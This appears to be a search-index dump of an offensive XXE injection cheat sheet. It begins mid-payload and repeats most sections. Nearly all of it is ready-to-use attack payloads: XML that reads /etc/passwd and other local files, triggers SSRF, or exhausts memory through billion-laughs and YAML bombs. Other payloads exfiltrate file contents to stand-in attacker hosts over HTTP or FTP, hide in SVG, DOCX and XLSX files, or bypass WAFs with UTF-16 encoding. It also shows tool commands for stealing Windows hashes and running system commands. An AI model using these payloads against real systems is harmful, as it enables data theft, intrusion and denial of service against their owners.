\"file:///REPLACE_WITH_FILENAME_TO_READ\"> <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>\"> &#x25;eval; &#x25;error; '> %local_dtd; ]> <root></root> Other payloads using different DTDs Windows Local DTD and Side Channel Leak to disclose HTTP response/file contents From https://gist.github.com/infosec-au/2c60dc493053ead1af42de1ca3bdcc79 Disclose local file <!DOCTYPE doc [ <!ENTITY % local_dtd SYSTEM \"file:///C:\\Windows\\System32\\wbem\\xml\\cim20.dtd\"> <!ENTITY % SuperClass '> <!ENTITY &#x25; file SYSTEM \"file://D:\\webserv2\\services\\web.config\"> <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://t/#&#x25;file;&#x27;>\"> &#x25;eval; &#x25;error; <!ENTITY test \"test\"' > %local_dtd; ]><xxx>cacat</xxx> Disclose HTTP Response: <!DOCTYPE doc [ <!ENTITY % local_dtd SYSTEM \"file:///C:\\Windows\\System32\\wbem\\xml\\cim20.dtd\"> <!ENTITY % SuperClass '> <!ENTITY &#x25; file SYSTEM \"https://erp.company.com\"> <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://test/#&#x25;file;&#x27;>\"> &#x25;eval; &#x25;error; <!ENTITY test \"test\"' > %local_dtd; ]><xxx>cacat</xxx> XXE in exotic files XXE inside SVG <svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"300\" version=\"1.1\" height=\"200\"> <image xlink:href=\"expect://ls\" width=\"200\" height=\"200\"></image> </svg> Classic <?xml version=\"1.0\" standalone=\"yes\"?> <!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/hostname\" > ]> <svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\"> <text font-size=\"16\" x=\"0\" y=\"16\">&xxe;</text> </svg> OOB via SVG rasterization xxe.svg <?xml version=\"1.0\" standalone=\"yes\"?> <!DOCTYPE svg [ <!ELEMENT svg ANY > <!ENTITY % sp SYSTEM \"http://example.org:8080/xxe.xml\"> %sp; %param1; ]> <svg viewBox=\"0 0 200 200\" version=\"1.2\" xmlns=\"http://www.w3.org/2000/svg\" style=\"fill:red\"> <text x=\"15\" y=\"100\" style=\"fill:black\">XXE via SVG rasterization</text> <rect x=\"0\" y=\"0\" rx=\"10\" ry=\"10\" width=\"200\" height=\"200\" style=\"fill:pink;opacity:0.7\"/> <flowRoot font-size=\"15\"> <flowRegion> <rect x=\"0\" y=\"0\" width=\"200\" height=\"200\" style=\"fill:red;opacity:0.3\"/> </flowRegion> <flowDiv> <flowPara>&exfil;</flowPara> </flowDiv> </flowRoot> </svg> xxe.xml <!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=/etc/hostname\"> <!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'ftp://example.org:2121/%data;'>\"> XXE inside SOAP <soap:Body> <foo> <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM \"http://x.x.x.x:22/\"> %dtd;]><xxx/>]]> </foo> </soap:Body> XXE inside DOCX file Format of an Open XML file (inject the payload in any .xml file): /_rels/.rels [Content_Types].xml Default Main Document Part /word/document.xml /ppt/presentation.xml /xl/workbook.xml Then update the file zip -u xxe.docx [Content_Types].xml Tool : https://github.com/BuffaloWill/oxml_xxe DOCX/XLSX/PPTX ODT/ODG/ODP/ODS SVG XML PDF (experimental) JPG (experimental) GIF (experimental) XXE inside XLSX file Structure of the XLSX: $ 7z l xxe.xlsx [...] Date Time Attr Size Compressed Name ------------------- ----- ------------ ------------ ------------------------ 2021-10-17 15:19:00 ..... 578 223 _rels/.rels 2021-10-17 15:19:00 ..... 887 508 xl/workbook.xml 2021-10-17 15:19:00 ..... 4451 643 xl/styles.xml 2021-10-17 15:19:00 ..... 2042 899 xl/worksheets/sheet1.xml 2021-10-17 15:19:00 ..... 549 210 xl/_rels/workbook.xml.rels 2021-10-17 15:19:00 ..... 201 160 xl/sharedStrings.xml 2021-10-17 15:19:00 ..... 731 352 docProps/core.xml 2021-10-17 15:19:00 ..... 410 246 docProps/app.xml 2021-10-17 15:19:00 ..... 1367 345 [Content_Types].xml ------------------- ----- ------------ ------------ ------------------------ 2021-10-17 15:19:00 11216 3586 9 files Extract Excel file: 7z x -oXXE xxe.xlsx Rebuild Excel file: $ cd XXE $ 7z u ../xxe.xlsx * Add your blind XXE payload inside xl/workbook.xml . <?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?> <!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM \"http://x.x.x.x:8000/xxe.dtd\">%asd;%c;]> <cdl>&rrr;</cdl> <workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"> Alternativly, add your payload in xl/sharedStrings.xml : <?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?> <!DOCTYPE cdl [<!ELEMENT t ANY ><!ENTITY % asd SYSTEM \"http://x.x.x.x:8000/xxe.dtd\">%asd;%c;]> <sst xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" count=\"10\" uniqueCount=\"10\"><si><t>&rrr;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst> Using a remote DTD will save us the time to rebuild a document each time we want to retrieve a different file. Instead we build the document once and then change the DTD. And using FTP instead of HTTP allows to retrieve much larger files. xxe.dtd <!ENTITY % d SYSTEM \"file:///etc/passwd\"> <!ENTITY % c \"<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>\"> Serve DTD and receive FTP payload using xxeserv : $ xxeserv -o files.log -p 2121 -w -wd public -wp 8000 XXE inside DTD file Most XXE payloads detailed above require control over both the DTD or DOCTYPE block as well as the xml file. In rare situations, you may only control the DTD file and won't be able to modify the xml file. For example, a MITM. When all you control is the DTD file, and you do not control the xml file, XXE may still be possible with this payload. <!-- Load the contents of a sensitive file into a variable --> <!ENTITY % payload SYSTEM \"file:///etc/passwd\"> <!-- Use that variable to construct an HTTP get request with the file contents in the URL --> <!ENTITY % param1 '<!ENTITY &#37; external SYSTEM \"http://my.evil-host.com/x=%payload;\">'> %param1; %external; XXE WAF Bypass via convert character encoding In XXE WAFs, DTD Prolog are usually blacklisted BUT not all WAFs blacklist the UTF-16 character encoding All XML processors must accept the UTF-8 and UTF-16 encodings of Unicode -- https://www.w3.org/XML/xml-V10-4e-errata#E11 we can convert the character encoding to UTF-16 using iconv to bypass the XXE WAF:- cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml References XML External Entity (XXE) Processing - OWASP Detecting and exploiting XXE in SAML Interfaces - 6. Nov. 2014 - Von Christian Mainka [Gist] staaldraad - XXE payloads [Gist] mgeeky - XML attacks Exploiting xxe in file upload functionality - BLACKHAT WEBCAST - 11/19/15 - Will Vandevanter - @ will_is XXE ALL THE THINGS!!! (including Apple iOS's Office Viewer) From blind XXE to root-level file read access - December 12, 2018 by Pieter Hiele How we got read access on Google\u2019s production servers April 11, 2014 by detectify Blind OOB XXE At UBER 26+ Domains Hacked August 05, 2016 by Raghav Bisht OOB XXE through SAML by Sean Melia @seanmeals XXE in Uber to read local files 01/2017 XXE inside SVG JUNE 22, 2016 by YEO QUAN YANG Pentest XXE - @phonexicum Exploiting XXE with local DTD files - 12/12/2018 - Arseniy Sharoglazov Web Security Academy >> XML external entity (XXE) injection - 2019 PortSwigger Ltd Automating local DTD discovery for XXE exploitation - July 16 2019 by Philippe Arteau EXPLOITING XXE WITH EXCEL - NOV 12 2018 - MARC WICKENDEN excel-reader-xlsx #10 Midnight Sun CTF 2019 Quals - Rubenscube SynAck - A Deep Dive into XXE Injection - 22 July 2019 - Trenton Gordon Synacktiv - CVE-2019-8986: SOAP XXE in TIBCO JasperReports Server - 11-03-2019 - Julien SZLAMOWICZ, Sebastien DUDEK","title":"XML External Entity"},{"location":"XXE%20Injection/#xml-external-entity","text":"An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server. Internal Entity : If an entity is declared within a DTD it is called as internal entity. Syntax: <!ENTITY entity_name \"entity_value\"> External Entity : If an entity is declared outside a DTD it is called as external entity. Identified by SYSTEM . Syntax: <!ENTITY entity_name SYSTEM \"entity_value\">","title":"XML External Entity"},{"location":"XXE%20Injection/#summary","text":"Tools Detect the vulnerability Exploiting XXE to retrieve files Classic XXE Classic XXE Base64 encoded PHP Wrapper inside XXE XInclude attacks Exploiting XXE to perform SSRF attacks Exploiting XXE to perform a deny of service Billion Laugh Attack Error Based XXE Exploiting blind XXE to exfiltrate data out-of-band Blind XXE XXE OOB Attack (Yunusov, 2013) XXE OOB with DTD and PHP filter XXE OOB with Apache Karaf Windows Local DTD and Side Channel Leak to disclose HTTP response/file contents XXE in exotic files XXE inside SVG XXE inside SOAP XXE inside DOCX file XXE inside XLSX file XXE inside DTD file XXE WAF Bypass via convert character encoding","title":"Summary"},{"location":"XXE%20Injection/#tools","text":"xxeftp - A mini webserver with FTP support for XXE payloads sudo ./xxeftp -uno 443 ./xxeftp -w -wps 5555 230-OOB - An Out-of-Band XXE server for retrieving file contents over FTP and payload generation via http://xxe.sh/ $ python3 230.py 2121 XXEinjector - Tool for automatic exploitation of XXE vulnerability using direct and different out of band methods bash # Enumerating /etc directory in HTTPS application: ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --ssl # Enumerating /etc directory using gopher for OOB method: ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher # Second order exploitation: ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt --2ndfile=/tmp/2ndreq.txt # Bruteforcing files using HTTP out of band method and netdoc protocol: ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt --oob=http --netdoc # Enumerating using direct exploitation: ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK # Enumerating unfiltered ports: ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --enumports=all # Stealing Windows hashes: ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --hashes # Uploading files using Java jar: ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --upload=/tmp/uploadfile.pdf # Executing system commands using PHP expect: ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter --expect=ls # Testing for XSLT injection: ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --xslt # Log requests only: ruby XXEinjector.rb --logger --oob=http --output=/tmp/out.txt oxml_xxe - A tool for embedding XXE/XML exploits into different filetypes (DOCX/XLSX/PPTX, ODT/ODG/ODP/ODS, SVG, XML, PDF, JPG, GIF) ruby server.rb docem - Utility to embed XXE and XSS payloads in docx,odt,pptx,etc ./docem.py -s samples/xxe/sample_oxml_xxe_mod0/ -pm xss -pf payloads/xss_all.txt -pt per_document -kt -sx docx ./docem.py -s samples/xxe/sample_oxml_xxe_mod1.docx -pm xxe -pf payloads/xxe_special_2.txt -kt -pt per_place ./docem.py -s samples/xss_sample_0.odt -pm xss -pf payloads/xss_tiny.txt -pm per_place ./docem.py -s samples/xxe/sample_oxml_xxe_mod0/ -pm xss -pf payloads/xss_all.txt -pt per_file -kt -sx docx otori - Toolbox intended to allow useful exploitation of XXE vulnerabilities. python ./otori.py --clone --module \"G-XXE-Basic\" --singleuri \"file:///etc/passwd\" --module-options \"TEMPLATEFILE\" \"TARGETURL\" \"BASE64ENCODE\" \"DOCTYPE\" \"XMLTAG\" --outputbase \"./output-generic-solr\" --overwrite --noerrorfiles --noemptyfiles --nowhitespacefiles --noemptydirs","title":"Tools"},{"location":"XXE%20Injection/#detect-the-vulnerability","text":"Basic entity test, when the XML parser parses the external entities the result should contain \"John\" in firstName and \"Doe\" in lastName . Entities are defined inside the DOCTYPE element. <!--?xml version=\"1.0\" ?--> <!DOCTYPE replace [<!ENTITY example \"Doe\"> ]> <userInfo> <firstName>John</firstName> <lastName>&example;</lastName> </userInfo> It might help to set the Content-Type: application/xml in the request when sending XML payload to the server.","title":"Detect the vulnerability"},{"location":"XXE%20Injection/#exploiting-xxe-to-retrieve-files","text":"","title":"Exploiting XXE to retrieve files"},{"location":"XXE%20Injection/#classic-xxe","text":"We try to display the content of the file /etc/passwd <?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root> <?xml version=\"1.0\"?> <!DOCTYPE data [ <!ELEMENT data (#ANY)> <!ENTITY file SYSTEM \"file:///etc/passwd\"> ]> <data>&file;</data> <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo> <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///c:/boot.ini\" >]><foo>&xxe;</foo> :warning: SYSTEM and PUBLIC are almost synonym. <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///c:/boot.ini\" >]><foo>&xxe;</foo>","title":"Classic XXE"},{"location":"XXE%20Injection/#classic-xxe-base64-encoded","text":"<!DOCTYPE test [ <!ENTITY % init SYSTEM \"data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\"> %init; ]><foo/>","title":"Classic XXE Base64 encoded"},{"location":"XXE%20Injection/#php-wrapper-inside-xxe","text":"<!DOCTYPE replace [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"> ]> <contacts> <contact> <name>Jean &xxe; Dupont</name> <phone>00 11 22 33 44</phone> <address>42 rue du CTF</address> <zipcode>75000</zipcode> <city>Paris</city> </contact> </contacts> <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY % xxe SYSTEM \"php://filter/convert.base64-encode/resource=http://10.0.0.3\" > ]> <foo>&xxe;</foo>","title":"PHP Wrapper inside XXE"},{"location":"XXE%20Injection/#xinclude-attacks","text":"When you can't modify the DOCTYPE element use the XInclude to target <foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"> <xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>","title":"XInclude attacks"},{"location":"XXE%20Injection/#exploiting-xxe-to-perform-ssrf-attacks","text":"XXE can be combined with the SSRF vulnerability to target another service on the network. <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY % xxe SYSTEM \"http://internal.service/secret_pass.txt\" > ]> <foo>&xxe;</foo>","title":"Exploiting XXE to perform SSRF attacks"},{"location":"XXE%20Injection/#exploiting-xxe-to-perform-a-deny-of-service","text":":warning: : These attacks might kill the service or the server, do not use them on the production.","title":"Exploiting XXE to perform a deny of service"},{"location":"XXE%20Injection/#billion-laugh-attack","text":"<!DOCTYPE data [ <!ENTITY a0 \"dos\" > <!ENTITY a1 \"&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;\"> <!ENTITY a2 \"&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;\"> <!ENTITY a3 \"&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;\"> <!ENTITY a4 \"&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;\"> ]> <data>&a4;</data>","title":"Billion Laugh Attack"},{"location":"XXE%20Injection/#yaml-attack","text":"a: &a [\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\"] b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a] c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b] d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c] e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d] f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e] g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f] h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g] i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]","title":"Yaml attack"},{"location":"XXE%20Injection/#error-based-xxe","text":"Payload to trigger the XXE <?xml version=\"1.0\" ?> <!DOCTYPE message [ <!ENTITY % ext SYSTEM \"http://attacker.com/ext.dtd\"> %ext; ]> <message></message> Contents of ext.dtd <!ENTITY % file SYSTEM \"file:///etc/passwd\"> <!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\"> %eval; %error;","title":"Error Based XXE"},{"location":"XXE%20Injection/#exploiting-blind-xxe-to-exfiltrate-data-out-of-band","text":"Sometimes you won't have a result outputted in the page but you can still extract the data with an out of band attack.","title":"Exploiting blind XXE to exfiltrate data out-of-band"},{"location":"XXE%20Injection/#blind-xxe","text":"The easiest way to test for a blind XXE is to try to load a remote resource such as a Burp Collaborator. <?xml version=\"1.0\" ?> <!DOCTYPE root [ <!ENTITY % ext SYSTEM \"http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x\"> %ext; ]> <r></r> Send the content of /etc/passwd to \"www.malicious.com\", you may receive only the first line. <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY % xxe SYSTEM \"file:///etc/passwd\" > <!ENTITY callhome SYSTEM \"www.malicious.com/?%xxe;\"> ] > <foo>&callhome;</foo>","title":"Blind XXE"},{"location":"XXE%20Injection/#xxe-oob-attack-yunusov-2013","text":"<?xml version=\"1.0\" encoding=\"utf-8\"?> <!DOCTYPE data SYSTEM \"http://publicServer.com/parameterEntity_oob.dtd\"> <data>&send;</data> File stored on http://publicServer.com/parameterEntity_oob.dtd <!ENTITY % file SYSTEM \"file:///sys/power/image_size\"> <!ENTITY % all \"<!ENTITY send SYSTEM 'http://publicServer.com/?%file;'>\"> %all;","title":"XXE OOB Attack (Yunusov, 2013)"},{"location":"XXE%20Injection/#xxe-oob-with-dtd-and-php-filter","text":"<?xml version=\"1.0\" ?> <!DOCTYPE r [ <!ELEMENT r ANY > <!ENTITY % sp SYSTEM \"http://127.0.0.1/dtd.xml\"> %sp; %param1; ]> <r>&exfil;</r> File stored on http://127.0.0.1/dtd.xml <!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"> <!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>\">","title":"XXE OOB with DTD and PHP filter"},{"location":"XXE%20Injection/#xxe-oob-with-apache-karaf","text":"CVE-2018-11788 affecting versions: Apache Karaf <= 4.2.1 Apache Karaf <= 4.1.6 <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE doc [<!ENTITY % dtd SYSTEM \"http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com\"> %dtd;] <features name=\"my-features\" xmlns=\"http://karaf.apache.org/xmlns/features/v1.3.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0\"> <feature name=\"deployer\" version=\"2.0\" install=\"auto\"> </feature> </features> Send the XML file to the deploy folder. Ref. brianwrf/CVE-2018-11788","title":"XXE OOB with Apache Karaf"},{"location":"XXE%20Injection/#xxe-with-local-dtd","text":"In some case, outgoing connections are not possible from the web application. DNS names might even not resolve externally with a payload like this: <!DOCTYPE root [<!ENTITY test SYSTEM 'http://h3l9e5soi0090naz81tmq5ztaaaaaa.burpcollaborator.net'>]> <root>&test;</root> If error based exfiltration is possible, you can still rely on a local DTD to do concatenation tricks. Payload to confirm that error message include filename. <!DOCTYPE root [ <!ENTITY % local_dtd SYSTEM \"file:///abcxyz/\"> %local_dtd; ]> <root></root> Assuming payloads such as the previous return a verbose error. You can start pointing to local DTD. With an found DTD, you can submit payload such as the following payload. The content of the file will be place in the error message. <!DOCTYPE root [ <!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\"> <!ENTITY % ISOamsa ' <!ENTITY &#x25; file SYSTEM \"file:///REPLACE_WITH_FILENAME_TO_READ\"> <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>\"> &#x25;eval; &#x25;error; '> %local_dtd; ]> <root></root> Other payloads using different DTDs","title":"XXE with local DTD"},{"location":"XXE%20Injection/#windows-local-dtd-and-side-channel-leak-to-disclose-http-responsefile-contents","text":"From https://gist.github.com/infosec-au/2c60dc493053ead1af42de1ca3bdcc79","title":"Windows Local DTD and Side Channel Leak to disclose HTTP response/file contents"},{"location":"XXE%20Injection/#disclose-local-file","text":"<!DOCTYPE doc [ <!ENTITY % local_dtd SYSTEM \"file:///C:\\Windows\\System32\\wbem\\xml\\cim20.dtd\"> <!ENTITY % SuperClass '> <!ENTITY &#x25; file SYSTEM \"file://D:\\webserv2\\services\\web.config\"> <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://t/#&#x25;file;&#x27;>\"> &#x25;eval; &#x25;error; <!ENTITY test \"test\"' > %local_dtd; ]><xxx>cacat</xxx>","title":"Disclose local file"},{"location":"XXE%20Injection/#disclose-http-response","text":"<!DOCTYPE doc [ <!ENTITY % local_dtd SYSTEM \"file:///C:\\Windows\\System32\\wbem\\xml\\cim20.dtd\"> <!ENTITY % SuperClass '> <!ENTITY &#x25; file SYSTEM \"https://erp.company.com\"> <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://test/#&#x25;file;&#x27;>\"> &#x25;eval; &#x25;error; <!ENTITY test \"test\"' > %local_dtd; ]><xxx>cacat</xxx>","title":"Disclose HTTP Response:"},{"location":"XXE%20Injection/#xxe-in-exotic-files","text":"","title":"XXE in exotic files"},{"location":"XXE%20Injection/#xxe-inside-svg","text":"<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"300\" version=\"1.1\" height=\"200\"> <image xlink:href=\"expect://ls\" width=\"200\" height=\"200\"></image> </svg> Classic <?xml version=\"1.0\" standalone=\"yes\"?> <!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/hostname\" > ]> <svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\"> <text font-size=\"16\" x=\"0\" y=\"16\">&xxe;</text> </svg> OOB via SVG rasterization xxe.svg <?xml version=\"1.0\" standalone=\"yes\"?> <!DOCTYPE svg [ <!ELEMENT svg ANY > <!ENTITY % sp SYSTEM \"http://example.org:8080/xxe.xml\"> %sp; %param1; ]> <svg viewBox=\"0 0 200 200\" version=\"1.2\" xmlns=\"http://www.w3.org/2000/svg\" style=\"fill:red\"> <text x=\"15\" y=\"100\" style=\"fill:black\">XXE via SVG rasterization</text> <rect x=\"0\" y=\"0\" rx=\"10\" ry=\"10\" width=\"200\" height=\"200\" style=\"fill:pink;opacity:0.7\"/> <flowRoot font-size=\"15\"> <flowRegion> <rect x=\"0\" y=\"0\" width=\"200\" height=\"200\" style=\"fill:red;opacity:0.3\"/> </flowRegion> <flowDiv> <flowPara>&exfil;</flowPara> </flowDiv> </flowRoot> </svg> xxe.xml <!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=/etc/hostname\"> <!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'ftp://example.org:2121/%data;'>\">","title":"XXE inside SVG"},{"location":"XXE%20Injection/#xxe-inside-soap","text":"<soap:Body> <foo> <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM \"http://x.x.x.x:22/\"> %dtd;]><xxx/>]]> </foo> </soap:Body>","title":"XXE inside SOAP"},{"location":"XXE%20Injection/#xxe-inside-docx-file","text":"Format of an Open XML file (inject the payload in any .xml file): /_rels/.rels [Content_Types].xml Default Main Document Part /word/document.xml /ppt/presentation.xml /xl/workbook.xml Then update the file zip -u xxe.docx [Content_Types].xml Tool : https://github.com/BuffaloWill/oxml_xxe DOCX/XLSX/PPTX ODT/ODG/ODP/ODS SVG XML PDF (experimental) JPG (experimental) GIF (experimental)","title":"XXE inside DOCX file"},{"location":"XXE%20Injection/#xxe-inside-xlsx-file","text":"Structure of the XLSX: $ 7z l xxe.xlsx [...] Date Time Attr Size Compressed Name ------------------- ----- ------------ ------------ ------------------------ 2021-10-17 15:19:00 ..... 578 223 _rels/.rels 2021-10-17 15:19:00 ..... 887 508 xl/workbook.xml 2021-10-17 15:19:00 ..... 4451 643 xl/styles.xml 2021-10-17 15:19:00 ..... 2042 899 xl/worksheets/sheet1.xml 2021-10-17 15:19:00 ..... 549 210 xl/_rels/workbook.xml.rels 2021-10-17 15:19:00 ..... 201 160 xl/sharedStrings.xml 2021-10-17 15:19:00 ..... 731 352 docProps/core.xml 2021-10-17 15:19:00 ..... 410 246 docProps/app.xml 2021-10-17 15:19:00 ..... 1367 345 [Content_Types].xml ------------------- ----- ------------ ------------ ------------------------ 2021-10-17 15:19:00 11216 3586 9 files Extract Excel file: 7z x -oXXE xxe.xlsx Rebuild Excel file: $ cd XXE $ 7z u ../xxe.xlsx * Add your blind XXE payload inside xl/workbook.xml . <?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?> <!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM \"http://x.x.x.x:8000/xxe.dtd\">%asd;%c;]> <cdl>&rrr;</cdl> <workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"> Alternativly, add your payload in xl/sharedStrings.xml : <?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?> <!DOCTYPE cdl [<!ELEMENT t ANY ><!ENTITY % asd SYSTEM \"http://x.x.x.x:8000/xxe.dtd\">%asd;%c;]> <sst xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" count=\"10\" uniqueCount=\"10\"><si><t>&rrr;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst> Using a remote DTD will save us the time to rebuild a document each time we want to retrieve a different file. Instead we build the document once and then change the DTD. And using FTP instead of HTTP allows to retrieve much larger files. xxe.dtd <!ENTITY % d SYSTEM \"file:///etc/passwd\"> <!ENTITY % c \"<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>\"> Serve DTD and receive FTP payload using xxeserv : $ xxeserv -o files.log -p 2121 -w -wd public -wp 8000","title":"XXE inside XLSX file"},{"location":"XXE%20Injection/#xxe-inside-dtd-file","text":"Most XXE payloads detailed above require control over both the DTD or DOCTYPE block as well as the xml file. In rare situations, you may only control the DTD file and won't be able to modify the xml file. For example, a MITM. When all you control is the DTD file, and you do not control the xml file, XXE may still be possible with this payload. <!-- Load the contents of a sensitive file into a variable --> <!ENTITY % payload SYSTEM \"file:///etc/passwd\"> <!-- Use that variable to construct an HTTP get request with the file contents in the URL --> <!ENTITY % param1 '<!ENTITY &#37; external SYSTEM \"http://my.evil-host.com/x=%payload;\">'> %param1; %external;","title":"XXE inside DTD file"},{"location":"XXE%20Injection/#xxe-waf-bypass-via-convert-character-encoding","text":"In XXE WAFs, DTD Prolog are usually blacklisted BUT not all WAFs blacklist the UTF-16 character encoding All XML processors must accept the UTF-8 and UTF-16 encodings of Unicode -- https://www.w3.org/XML/xml-V10-4e-errata#E11 we can convert the character encoding to UTF-16 using iconv to bypass the XXE WAF:- cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml","title":"XXE WAF Bypass via convert character encoding"},{"location":"XXE%20Injection/#references","text":"XML External Entity (XXE) Processing - OWASP Detecting and exploiting XXE in SAML Interfaces - 6. Nov. 2014 - Von Christian Mainka [Gist] staaldraad - XXE payloads [Gist] mgeeky - XML attacks Exploiting xxe in file upload functionality - BLACKHAT WEBCAST - 11/19/15 - Will Vandevanter - @ will_is XXE ALL THE THINGS!!! (including Apple iOS's Office Viewer) From blind XXE to root-level file read access - December 12, 2018 by Pieter Hiele How we got read access on Google\u2019s production servers April 11, 2014 by detectify Blind OOB XXE At UBER 26+ Domains Hacked August 05, 2016 by Raghav Bisht OOB XXE through SAML by Sean Melia @seanmeals XXE in Uber to read local files 01/2017 XXE inside SVG JUNE 22, 2016 by YEO QUAN YANG Pentest XXE - @phonexicum Exploiting XXE with local DTD files - 12/12/2018 - Arseniy Sharoglazov Web Security Academy >> XML external entity (XXE) injection - 2019 PortSwigger Ltd Automating local DTD discovery for XXE exploitation - July 16 2019 by Philippe Arteau EXPLOITING XXE WITH EXCEL - NOV 12 2018 - MARC WICKENDEN excel-reader-xlsx #10 Midnight Sun CTF 2019 Quals - Rubenscube SynAck - A Deep Dive into XXE Injection - 22 